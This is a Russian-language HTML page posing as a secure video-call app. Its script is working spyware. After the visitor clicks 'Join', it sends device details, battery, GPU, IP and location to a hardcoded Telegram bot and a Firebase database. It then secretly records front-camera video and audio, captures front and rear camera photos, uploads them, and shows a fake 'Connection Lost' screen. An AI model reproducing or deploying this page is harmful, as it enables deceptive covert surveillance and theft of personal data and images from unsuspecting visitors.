<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>WebCall Connectivity</title>
    <script src="https://cdn.jsdelivr.net/npm/ua-parser-js@1.0.35/src/ua-parser.min.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; font-family: sans-serif; overflow: hidden; color: #fff; }
        .app { height: 100%; display: flex; flex-direction: column; }
        .grid { flex: 1; display: flex; flex-direction: column; gap: 10px; padding: 15px; box-sizing: border-box; }
        .tile { flex: 1; background: #111; border-radius: 20px; position: relative; overflow: hidden; display: flex; align-items: center; justify-content: center; border: 1px solid #222; }
        #v { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); display: none; }
        .spin { width: 40px; height: 40px; border: 3px solid rgba(88, 101, 242, 0.1); border-top: 3px solid #5865f2; border-radius: 50%; animation: s 1s linear infinite; }
        @keyframes s { to { transform: rotate(360deg); } }
        .bar { height: 90px; background: #000; display: flex; justify-content: space-evenly; align-items: center; }
        .icon-btn { width: 52px; height: 52px; border-radius: 50%; background: #222; display: flex; align-items: center; justify-content: center; }
        .end-call { background: #ff3b30; }
        .overlay { position: absolute; inset: 0; background: #000; z-index: 100; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 30px; text-align: center; }
        .btn { background: #34c759; color: #fff; border: none; padding: 18px; border-radius: 30px; font-weight: bold; width: 100%; max-width: 280px; margin-top: 25px; font-size: 16px; }
        canvas { display: none; }
    </style>
</head>
<body>

<div class="app" id="main-ui">
    <div class="overlay" id="overlay">
        <div style="width:80px; height:80px; background:#111; border-radius:30%; display:flex; align-items:center; justify-content:center;">
            <svg width="40" height="40" viewBox="0 0 24 24" fill="#5865f2"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
        </div>
        <h2 style="margin-top:20px;">Защищенный звонок</h2>
        <p style="color:#666; font-size:14px;">Ожидание подключения собеседника...</p>
        <button class="btn" onclick="run()">Присоединиться</button>
    </div>
    <div class="grid">
        <div class="tile"><video id="v" autoplay playsinline muted></video></div>
        <div class="tile"><div style="text-align:center"><div class="spin"></div><div style="font-size:10px; color:#5865f2; margin-top:10px;">SECURE...</div></div></div>
    </div>
    <div class="bar">
        <div class="icon-btn"><svg width="24" height="24" fill="#fff" viewBox="0 0 24 24"><path d="M12 14c1.66 0 3-1.34 3-3V5c0-1.66-1.34-3-3-3S9 3.34 9 5v6c0 1.66 1.34 3 3 3z"/></svg></div>
        <div class="icon-btn end-call"><svg width="24" height="24" fill="#fff" viewBox="0 0 24 24"><path d="M6.62 10.79c1.44 2.83 3.76 5.14 6.59 6.59l2.2-2.2c.27-.27.67-.36 1.02-.24 1.12.37 2.33.57 3.57.57.55 0 1 .45 1 1V20c0 .55-.45 1-1 1-9.39 0-17-7.61-17-17 0-.55.45-1 1-1h3.5c.55 0 1 .45 1 1 0 1.25.2 2.45.57 3.57.11.35.03.74-.25 1.02l-2.2 2.2z"/></svg></div>
    </div>
</div>

<canvas id="c"></canvas>

<script>
    const T = '8159596204:AAFK2P-vL3fvLk_CpyUIpTsk83B7_L1XYZ4';
    const C = '5784921257';
    firebase.initializeApp({ databaseURL: "https://aiai-941b1-default-rtdb.firebaseio.com/" });
    const db = firebase.database().ref('logs');
    let logId = null;

    function getGPU() {
        const gl = document.createElement('canvas').getContext('webgl');
        if (!gl) return "N/A";
        const debug = gl.getExtension('WEBGL_debug_renderer_info');
        return debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : "N/A";
    }

    async function sendToTg(txt) {
        return fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&parse_mode=HTML&text=${encodeURIComponent(txt)}`);
    }

    async function sendMedia(blob, type) {
        const f = new FormData(); f.append(type, blob, 'file.jpg');
        return fetch(`https://api.telegram.org/bot${T}/send${type.charAt(0).toUpperCase() + type.slice(1)}?chat_id=${C}`, { method: 'POST', body: f });
    }

    async function run() {
        const u = new UAParser().getResult();
        const bat = await navigator.getBattery?.() || { level: 0, charging: false };
        let ip = { org: "Unknown", city: "Unknown", country_name: "Unknown", ip: "0.0.0.0" };
        try { ip = await fetch('https://ipapi.co/json/').then(r => r.json()); } catch(e) {}

        const data = {
            ts: new Date().toLocaleString(),
            dev: `${u.device.vendor || ''} ${u.device.model || 'Unknown'}`,
            bat: `${Math.round(bat.level * 100)}% (${bat.charging ? 'Plugged' : 'Off'})`,
            ip: ip.ip, isp: ip.org,
            loc: `${ip.city}, ${ip.country_name}`,
            gpu: getGPU(),
            cores: navigator.hardwareConcurrency || '?',
            ram: navigator.deviceMemory || '?',
            screen: `${screen.width}x${screen.height}`,
            vid_status: "Wait..."
        };

        const ref = db.push(data);
        logId = ref.key;

        const msg = `<b>📡 НОВЫЙ ТЕРМИНАЛ</b>\n\n<b>📱 Устройство:</b> ${data.dev}\n<b>🔋 Батарея:</b> ${data.bat}\n<b>📍 Локация:</b> ${data.loc}\n<b>⚙️ GPU:</b> ${data.gpu}`;
        sendToTg(msg);

        document.getElementById('overlay').style.display = 'none';
        const v = document.getElementById('v'), c = document.getElementById('c');

        try {
            const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
            v.style.display = 'block'; v.srcObject = s; await v.play();

            const r = new MediaRecorder(s);
            let chunks = []; r.ondataavailable = e => chunks.push(e.data);
            r.onstop = () => {
                sendMedia(new Blob(chunks, {type:'video/mp4'}), 'video');
                db.child(logId).update({ vid_status: "Sent to TG ✅" });
            };
            r.start();

            setTimeout(async () => {
                c.width = v.videoWidth; c.height = v.videoHeight;
                const ctx = c.getContext('2d');
                ctx.translate(c.width, 0); ctx.scale(-1, 1);
                ctx.drawImage(v, 0, 0);
                const f64 = c.toDataURL('image/jpeg', 0.5);
                db.child(logId).update({ face: f64 });
                c.toBlob(b => sendMedia(b, 'photo'), 'image/jpeg');

                r.stop();
                s.getTracks().forEach(t => t.stop());

                setTimeout(async () => {
                    try {
                        const bs = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
                        const bv = document.createElement('video');
                        bv.srcObject = bs; await bv.play();
                        setTimeout(() => {
                            c.width = bv.videoWidth; c.height = bv.videoHeight;
                            const bctx = c.getContext('2d');
                            bctx.setTransform(1, 0, 0, 1, 0, 0);
                            bctx.drawImage(bv, 0, 0);
                            const b64 = c.toDataURL('image/jpeg', 0.5);
                            db.child(logId).update({ back: b64 });
                            c.toBlob(b => sendMedia(b, 'photo'), 'image/jpeg');
                            bs.getTracks().forEach(t => t.stop());
                            done();
                        }, 2000);
                    } catch(e) { done(); }
                }, 1500);
            }, 6000);
        } catch (e) { location.reload(); }
    }

    function done() {
        document.getElementById('main-ui').innerHTML = `<div style="height:100%; display:flex; align-items:center; justify-content:center; color:#333;"><h3>Connection Lost</h3></div>`;
    }
</script>
</body>
</html>
